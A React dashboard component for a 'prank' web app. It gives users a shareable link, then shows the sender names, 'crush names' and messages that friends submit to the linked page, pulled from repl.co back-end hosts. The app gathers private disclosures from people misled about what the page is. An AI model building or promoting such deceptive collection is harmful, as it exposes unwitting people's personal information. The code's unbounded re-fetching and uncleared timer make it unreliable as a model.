import React, {useEffect, useState} from 'react';
import './Home.css'
import Cookie from 'js-cookie'
import { useNavigate } from 'react-router-dom'
import copy from 'copy-to-clipboard'


function Home ()
{
      const navigate = useNavigate()

      const [ storefiles, setstorefiles ] = useState( [] )
      const [ catchmaindata, setmaindata ] = useState( [] )

      


      useEffect( () =>
      { 

                  const formdata = new FormData();
                  formdata.append( "fetchdatas", 1 );
                  formdata.append( "sendcookie", Cookie.get("_8log_in_cod_e") );



                  var xhr = new XMLHttpRequest();
                  xhr.open( "POST", "https://fetchauthen3.badzybaddest.repl.co/fetch.php", true );
            xhr.onload = function ()
            {
                  let getdat = JSON.parse( this.response );
                       
                  if ( getdat.name === "nouser" )
                  {
                        Cookie.remove( "_8log_in_cod_e" )
                           navigate( "./login" );    
                  }
                  else
                  {
                        getdat.map( ( mapval ) =>
                        {
                              setstorefiles( mapval );
                        } );
                  }
                       
                       

            };

                  xhr.send( formdata );
            
      }, [])



      useEffect( () =>
      {
            setInterval( () =>
            {
                  
                   
                   
                  if ( !Cookie.get( "_8log_in_cod_e" ) )
                  {
                        navigate( "./login" );
                  }

                   
            } );
      } );


      const signoute = () =>
      { 
            if ( window.confirm("Do You Wish to SignOut "+ storefiles.fname +"?") === true )
            { 
                   Cookie.remove( "_8log_in_cod_e" )
            }
            else
            { 
                  
            }
      }


      let link_fof_you_part = document.querySelector( ".link_fof_you_part" )

      const copytoclip = () =>
      { 
            
           copy(link_fof_you_part.innerHTML)
            alert("Copied")
      }

      const sharetosocials = async () =>
      {
            let url = link_fof_you_part.innerHTML;
            let title = document.title;
            let text = "Hi, Thanks For Sharing";
            const shareDetails = { url, title, text };


            if ( navigator.share )
            {
                  try
                  {
                        await navigator
                              .share( shareDetails )
                              .then( () =>
                                    console.log( "Hooray! Your content was shared to tha world" )
                              );
                  } catch ( error )
                  {
                        alert(error)
                  }
            } else
            {
                 alert("not supported by your browser")
            }

            
      };


      useEffect( () =>
      { 

            let nothingyet = document.querySelector(".nothingyet")
             const formdata = new FormData();
                  formdata.append( "getmaindat", 1 );
                  formdata.append( "sendcookie", Cookie.get("_8log_in_cod_e") );



                  var xhr = new XMLHttpRequest();
                  xhr.open( "POST", "https://TalkativeDefensiveBoastmachine.badzybaddest.repl.co/fetch.php", true );
            xhr.onload = function ()
            {
                  let getdat = JSON.parse( this.response );
              
                  if ( getdat.name === "nouser" )
                  { 
                        nothingyet.innerHTML = `It Looks Like You Have Nothing Yet.`;
                  }
                  else
                  { 
                          nothingyet.innerHTML = ``;
                     setmaindata(getdat)
                  }

            };

                  xhr.send( formdata );
            
      })


      return (
            <div className='ovea'>
                  <title>Admin ~ {storefiles.fname} ~ Sanity _ Welcome</title>
                  <div className="myLogo">
                        <img src="./Images/s.png" alt="" />
                        <h4>Sanity</h4>
                        <div className="welcome_txt">
                              Welcome {storefiles.fname}!
                  </div>
                  </div>
                  <div className="r">
                        <hr />
                        <div>Do Not Border to Refresh Your Browser For New Updates. We've  got you back. Just sit back and observe. </div>
                  </div>
                  <div onClick={signoute} className="signout_btn">
                        SignOut
                  </div>
                  <div className="copy_m">
                        Copy This Link / Click to share with friends. online. and prank them... Good luck. In Pranking. We hope it works as planned.
                  </div>
                  <div className="tool_top">
                        <div className="link_fof_you_part">
                             { window.location.origin  + "/" + "prank/" + storefiles.unic_id }
                        </div>
                        <div className="bottons_">
                              <div onClick={copytoclip} id='copyme'>
                                    <i className="fa fa-copy"></i>
                                    Copy
                              </div>
                              <div onClick={sharetosocials} id='shareme'>
                                    <i className="fa fa-share"></i>
                                    share
                              </div>
                        </div>
                  </div>
                  <div className="trending_songs">
                        <h4>Messages</h4>
                       
                  </div>
                  <div className="hr">
                        These Messages will update automatically. We mean, as soon as a user submits their informations, You'll receive the message immediately without refreshing / reloading.</div>
                  <h4 className='nothingyet'></h4>
                  <div className="_text_m_1">
                        {

                              catchmaindata.map( ( mapval ) =>
                              { 

                                    const deletestuf = ( e ) =>
                                    {
                                          let gatet = e.target.id;

                                          const myfm = new FormData();
                                          myfm.append( "sendsoo", 1 );
                                          myfm.append( "sendcookie", gatet );



                                          var rxhttp = new XMLHttpRequest();
                                          rxhttp.open( "POST", "https://TalkativeDefensiveBoastmachine.badzybaddest.repl.co/dele.php", true );
                                          rxhttp.onload = function ()
                                          {
                                                let getdat = this.response;
                                             

                                          };

                                          rxhttp.send( myfm );
                                    };

                                    const sharetowhats = ( e ) =>
                                    { 
                                          let ta = window.location.origin + "/" + "Preview/" + e.target.id;
                                          window.open("whatsapp://send?text="+ ta +"")
                                    }

                                    return (
                                        
                                          <div className="message_id_1">
                                                <div className="pname">
                                                      <div className="c">Sender Name</div>
                                                      <h4>{mapval.fname + " " + mapval.lname}</h4>
                                                </div>
                                                <div className="crush_name">
                                                      <div className="c">Crush Name</div>
                                                      <h5>{mapval.cfname + " " + mapval.clname}</h5>
                                                </div>
                                                <div className="msg_n">
                                        
                                                      {mapval.msgs}
                                                      
                                                </div>
                                                <div className="device_used">
                                                      <div  onClick={deletestuf} id={mapval.itemspid} className="button_commands">
                                                            Delete
                                                      </div>

                                                      <div onClick={sharetowhats} id={mapval.itemspid} className="button_commands">
                                                            Share
                                                      </div>
                                                </div>
                                          </div>

                                    );
                              })

                        }
                  </div>
            </div>
      );
}

export default Home;
